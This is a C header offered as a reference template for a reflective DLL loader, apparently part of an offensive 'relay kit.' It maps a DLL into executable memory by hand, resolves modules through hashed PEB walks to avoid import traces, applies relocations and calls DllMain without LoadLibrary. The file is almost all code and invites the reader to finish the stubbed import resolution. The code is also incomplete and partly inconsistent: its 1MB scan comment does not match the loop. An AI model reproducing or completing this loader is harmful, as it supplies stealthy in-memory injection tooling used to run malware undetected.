/*
 * Reflective DLL Loader — Relay-kit Reference Template
 * No CRT dependency. No import table dependency at load time.
 * Compatible: Windows 10/11 x64.
 *
 * Concept: The DLL contains a ReflectiveLoader export that, when called with the DLL's
 *          own base address, manually maps the DLL into memory by parsing its own PE headers,
 *          resolving imports, applying relocations, and calling DllMain — without LoadLibrary.
 *
 * Reference: Stephen Fewer's ReflectiveDLLInjection (MIT License) — this is a minimal
 *            stripped reference, not a full copy. Extend as needed.
 */

#pragma once
#include <Windows.h>
#include <winternl.h>

/* Locate the calling DLL's base address from the return address on the stack */
static ULONG_PTR GetCallerBase() {
    ULONG_PTR uiReturnAddress;
#ifdef _WIN64
    /* Walk back from return address to find MZ header */
    uiReturnAddress = (ULONG_PTR)_ReturnAddress();
#else
    uiReturnAddress = (ULONG_PTR)__builtin_return_address(0);
#endif
    /* Scan backwards for MZ signature (max 1MB) */
    ULONG_PTR base = uiReturnAddress & ~0xFFFF;
    for (int i = 0; i < 64; i++, base -= 0x10000) {
        __try {
            if (*(WORD*)base == IMAGE_DOS_SIGNATURE)
                return base;
        } __except(EXCEPTION_EXECUTE_HANDLER) {}
    }
    return 0;
}

/* Walk PEB InMemoryOrderModuleList to find a loaded module base by hash (avoid GetProcAddress import) */
static ULONG_PTR GetModuleBaseByHash(DWORD targetHash) {
    PEB* pPeb = (PEB*)__readgsqword(0x60);
    LIST_ENTRY* pList = pPeb->Ldr->InMemoryOrderModuleList.Flink;
    while (pList != &pPeb->Ldr->InMemoryOrderModuleList) {
        LDR_DATA_TABLE_ENTRY* pEntry = CONTAINING_RECORD(
            pList, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        /* Hash the module name and compare */
        WCHAR* name = pEntry->FullDllName.Buffer;
        DWORD hash = 0;
        if (name) {
            while (*name) { hash = ((hash << 5) + hash) + (*name++ | 0x20); }
        }
        if (hash == targetHash)
            return (ULONG_PTR)pEntry->DllBase;
        pList = pList->Flink;
    }
    return 0;
}

/*
 * ReflectiveLoader — entry point called by injector with DLL base address.
 * Steps:
 *   1. Locate DLL base (self, via GetCallerBase or passed explicitly).
 *   2. Parse NT headers → get SizeOfImage.
 *   3. VirtualAlloc new region sized SizeOfImage.
 *   4. Copy PE headers + sections to new region.
 *   5. Apply base relocations (IMAGE_DIRECTORY_ENTRY_BASERELOC).
 *   6. Resolve import table (IMAGE_DIRECTORY_ENTRY_IMPORT) via PEB walk, no LoadLibrary import.
 *   7. Flush instruction cache (NtFlushInstructionCache).
 *   8. Call DllMain(newBase, DLL_PROCESS_ATTACH, NULL).
 *   9. Return DllMain or exported function address to caller.
 *
 * NOTE: Full implementation is ~400 lines of C. This stub documents the contract and flow.
 *       Use Stephen Fewer's original or modexp's variant as the implementation base.
 */
__declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter) {
    ULONG_PTR dllBase = GetCallerBase();
    if (!dllBase) return 0;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dllBase + dosHeader->e_lfanew);
    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;

    /* Alloc new region — prefer RX after setup, start with RWX */
    LPVOID newBase = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!newBase) return 0;

    /* Copy headers */
    memcpy(newBase, (PVOID)dllBase, ntHeaders->OptionalHeader.SizeOfHeaders);

    /* Copy sections */
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, sec++) {
        memcpy((PBYTE)newBase + sec->VirtualAddress,
               (PBYTE)dllBase + sec->PointerToRawData,
               sec->SizeOfRawData);
    }

    /* Apply relocations (delta = newBase - ImageBase) */
    LONGLONG delta = (LONGLONG)newBase - (LONGLONG)ntHeaders->OptionalHeader.ImageBase;
    PIMAGE_DATA_DIRECTORY relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (delta && relocDir->Size) {
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)newBase + relocDir->VirtualAddress);
        while (reloc->VirtualAddress) {
            WORD* entries = (WORD*)(reloc + 1);
            DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            for (DWORD j = 0; j < count; j++) {
                if ((entries[j] >> 12) == IMAGE_REL_BASED_DIR64) {
                    ULONG_PTR* patch = (ULONG_PTR*)((PBYTE)newBase + reloc->VirtualAddress + (entries[j] & 0xFFF));
                    *patch += (ULONG_PTR)delta;
                }
            }
            reloc = (PIMAGE_BASE_RELOCATION)((PBYTE)reloc + reloc->SizeOfBlock);
        }
    }

    /* Resolve imports — abbreviated; full impl resolves by name hash via PEB walk */
    /* ... (extend here) ... */

    /* Flush instruction cache */
    typedef NTSTATUS(NTAPI* NtFlushInstructionCacheFn)(HANDLE, PVOID, ULONG);
    /* Resolve NtFlushInstructionCache via PEB walk (hash: compute for "NtFlushInstructionCache") */
    /* ... (extend here) ... */

    /* Call DllMain */
    typedef BOOL(WINAPI* DllMainFn)(HINSTANCE, DWORD, LPVOID);
    DllMainFn dllMain = (DllMainFn)((PBYTE)newBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    dllMain((HINSTANCE)newBase, DLL_PROCESS_ATTACH, NULL);

    return (ULONG_PTR)newBase;
}
